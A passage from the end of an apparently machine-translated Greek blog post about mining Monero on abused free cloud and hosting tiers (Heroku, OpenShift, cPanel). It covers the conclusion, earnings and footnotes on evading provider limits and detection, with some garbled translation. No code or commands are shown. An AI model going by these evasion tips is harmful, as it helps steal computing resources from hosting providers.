δίνονται, καθώς οι κατασκευές εκτελούνται εντός εικονικών μηχανών ή κοντέινερ με περιορισμένους πόρους ... και η μεταγλώττιση είναι συνήθως μια εργασία που κορεσμένο cpu, οπότε δεν έχει στατιστική συνάφεια. Διαισθητικά μια κατασκευή την ημέρα είναι αυτό που θα έκανε ο μέσος προγραμματιστής, οπότε θα πρέπει να περιμένετε υψωμένες σημαίες αν ξεφύγετε από το μέσο όρο και η πίεση για κατάχρηση δεν τελειώνει ποτέ καλά.<h2 id=conclusions><a class=header-anchor href=#conclusions> Συμπεράσματα</a></h2><p>Αξιζε? Τα τμήματα δικτύωσης ήταν σίγουρα ενδιαφέροντα, η αντιμετώπιση των εγγραφών λογαριασμών ήταν προφανώς το χειρότερο μέρος, σε κανέναν δεν αρέσει να κάνει κλικ σε ατελείωτα μηνύματα ηλεκτρονικού ταχυδρομείου επιβεβαίωσης και, τέλος πάντων, να επαναλαμβάνει τις διαδικασίες διεπαφής χρήστη. Η συγγραφή λογισμικού αυτοματοποίησης ανεπιθύμητης αλληλογραφίας είναι επίσης βαρετή (επειδή κυρίως ασχολείστε με χαζά API) και με αυτήν την υπόθεση (και το γεγονός ότι αυτό δεν ήταν ποτέ κάτι σοβαρό) δεν το σκέφτηκα ποτέ. Profταν κερδοφόρο; Στην κορύφωσή του έφτανε σε κάτι σαν<code>300$</code> ανά μήνα, ίσως αρκετά για έναν venezuelan, όχι πραγματικά για μένα :)<p><table class=fndef id=fndef:adversary><tbody><tr><td class=fndef-backref><a href=#fnref:adversary>[1]</a><td class=fndef-content><em> ο γκρινιάρης sysadmin</em></table><table class=fndef id=fndef:infoproc><tbody><tr><td class=fndef-backref><a href=#fnref:infoproc>[2]</a><td class=fndef-content>Παρόλο που αυτό θα σπάσει πολλές υποθέσεις απορρήτου, είμαι σίγουρος ότι οι περισσότεροι απλώς κοιτάζουν μέσα κάθε φορά που υπάρχει ένα υπάρχον πρόβλημα, αλλά αυτό είναι πρόβλημα μόνο για τους χρόνους εκτέλεσης που βασίζονται σε εμπορευματοκιβώτια, ενώ οι εικονικές μηχανές είναι σχεδόν μαύρα κουτιά.</table><table class=fndef id=fndef:monerominer><tbody><tr><td class=fndef-backref><a href=#fnref:monerominer>[3]</a><td class=fndef-content>ο ανθρακωρύχος που είναι ενσωματωμένος στον κόμβο monero έκανε κάποια δουλειά για να γίνει πιο φιλικός στο φόντο, αλλά η διανομή του xmrig δεν επικεντρώθηκε ποτέ στη φιλικότητα στο παρασκήνιο.</table><table class=fndef id=fndef:difficulty><tbody><tr><td class=fndef-backref><a href=#fnref:difficulty>[5]</a><td class=fndef-content>ορισμένες ομάδες προσφέρουν διαφορετικές δυσκολίες σε διαφορετικές θύρες σύνδεσης και τείνουν να ευθυγραμμίσουν τη δυσκολία εργασίας με τις μετοχές που υπέβαλε ο ανθρακωρύχος, αλλά η λεπτομέρεια του πληρεξούσιου ήταν ακόμα πιο βολική, καθώς θα απέτρεπε τη συγκέντρωση<a href=https://en.wikipedia.org/wiki/Vendor_lock-in> κλειδώσει</a> (αν και δεν αλλάξαμε ποτέ πισίνες).</table><table class=fndef id=fndef:configwatch><tbody><tr><td class=fndef-backref><a href=#fnref:configwatch>[4]</a><td class=fndef-content>δεν ήταν χαρούμενο όταν εμφανίστηκε ξαφνικά το config και εξαφανίστηκε από το σύστημα αρχείων</table><table class=fndef id=fndef:stratumprotocol><tbody><tr><td class=fndef-backref><a href=#fnref:stratumprotocol>[6]</a><td class=fndef-content>Δεν μιλάμε για<a href=https://en.bitcoin.it/wiki/Stratum_mining_protocol> πρωτόκολλο στρωμάτων</a> αφού απλώς πρέπει να ασχοληθούμε με οτιδήποτε υλοποιείται<em> και τα δυο</em> η πισίνα και ο ανθρακωρύχος ... που είναι συνήθως το ελάχιστο, και πιθανώς με μη τυπικές επεκτάσεις.</table><table class=fndef id=fndef:fullbash><tbody><tr><td class=fndef-backref><a href=#fnref:fullbash>[7]</a><td class=fndef-content>μην πας ποτέ εντελώς :)</table><table class=fndef id=fndef:memoryondemand><tbody><tr><td class=fndef-backref><a href=#fnref:memoryondemand>[8]</a><td class=fndef-content>Δεν έχω διερευνήσει τι συμβαίνει όταν μια διεργασία φορτώνει πρόσθετες λειτουργίες κατά την εκτέλεση, καθώς ο πυρήνας θα αναζητούσε τη διεύθυνση στη διάταξη μνήμης του εκτελέσιμου, η οποία θα είχε πρόσβαση στο σύστημα αρχείων και πιθανώς θα προκαλούσε συντριβή.</table><table class=fndef id=fndef:freehostinglimits><tbody><tr><td class=fndef-backref><a href=#fnref:freehostinglimits>[9]</a><td class=fndef-content>Τα όρια είναι αυθαίρετα, ο χρόνος cpu είναι μικρότερος από ένα δευτερόλεπτο, η μνήμη είναι μικρότερη από 128M, οι εξερχόμενες συνδέσεις αποκλείονται.</table><table class=fndef id=fndef:cpanelssh><tbody><tr><td class=fndef-backref><a href=#fnref:cpanelssh>[10]</a><td class=fndef-content>με λίγη υπομονή, μπορείτε επίσης να εκτελέσετε μια πλήρη εμφάνιση ssh σε ένα περιβάλλον εκκίνησης που έχει παγιδευτεί στο χώρο του λογαριασμού σας cpanel,<em> χωρίς</em> έχοντας πρόσβαση στο ενσωματωμένο cpanel SSH το οποίο τείνει να απενεργοποιηθεί από τους παρόχους φιλοξενίας.</table><table class=fndef id=fndef:openshift><tbody><tr><td class=fndef-backref><a href=#fnref:openshift>[11]</a><td class=fndef-content>Το openshift πέρασε από 1 χρόνο δωρεάν βαθμίδα σε 3 μήνες σε 1 μήνα, αρχίζοντας να απαιτεί έλεγχο ταυτότητας μέσω τηλεφώνου, μπορώ να εγγυηθώ ότι δεν ήμουν ο μόνος που έκανε κατάχρηση των υπηρεσιών τους.</table><table class=fndef id=fndef:herokucontainers><tbody><tr><td class=fndef-backref><a href=#fnref:herokucontainers>[12]</a><td class=fndef-content>Τα εμπορευματοκιβώτια δωρεάν Heroku είναι αρκετά γενναιόδωρα σε πόρους, παρέχουν 4c/8t (εικονικό) cpus, άφθονο κριάρι και μεγάλο αποθηκευτικό χώρο (το οποίο ωστόσο δεν είναι επίμονο και απορρίπτεται σε περίπτωση dyno shutdown).</table><table class=fndef id=fndef:saddrone><tbody><tr><td class=fndef-backref><a href=#fnref:saddrone>[13]</a><td class=fndef-content>Προσθέτουν αυστηρότερους κανόνες εγγραφής, μετά από μερικές απαγορεύσεις, ίσως να συνέβαλα σε αυτό.</table><p><div id=post-tags-list>Ετικέτες ανάρτησης: <span class=post-tag><a href=https://www.unto.re/tag/crypto> κρυπτογράφηση</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/net> καθαρά</a>, </span><span class=post-tag><a href=https://www.unto.re/tag/shell> κέλυφος</a></span></div><div class=page-foot><div class=copyright>21 Αυγούστου 2021</div><script async crossorigin=anonymous issue-term=pathname label=Comment repo=untoreh/untoreh.github.io src=https://utteranc.es/client.js></script></div></div><div class=page__footer><footer><div class=page__footer-copyright>© untoreh - Powered by<a href=https://github.com/tlienart/Franklin.jl> Φράνκλιν</a></div><div class=page__footer-links>- <ul><li><a href=/el/sitemapxml> Χάρτης ιστοτόπου</a></li> | <li><a href=/el/tag> Ετικέτες</a></li> | <li><a href=https://www.unto.re/tag/feed.xml> RSS</a></ul></div><ul class=author__wrap><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer" title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></footer></div><script crossorigin=anonymous defer id=fa integrity=sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH src=https://use.fontawesome.com/releases/v5.8.2/js/all.js></script><script src=/libs/colors.js></script><script src=/libs/menu.js></script><script defer src=/libs/lunr/lunr.min.js></script>